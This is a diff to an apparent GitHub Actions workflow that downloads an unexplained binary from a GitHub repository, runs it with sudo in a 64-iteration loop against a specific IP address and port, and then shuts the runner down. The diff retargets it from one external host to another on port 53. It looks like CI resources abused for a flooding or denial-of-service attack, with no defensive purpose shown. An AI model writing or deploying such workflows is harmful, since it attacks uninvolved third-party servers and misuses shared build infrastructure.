@@ -17,11 +17,11 @@ jobs:
           wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
           chmod +x tekpoyraz
           for i in {1..64}; do
-            timeout 20 sudo ./tekpoyraz 109.235.248.82 30003
+            timeout 25 sudo ./tekpoyraz 78.163.5.176 53
           done
 
       - name: OK !
-        run: sleep 20
+        run: sleep 25
         
       - name: OK !
         run: sudo shutdown now
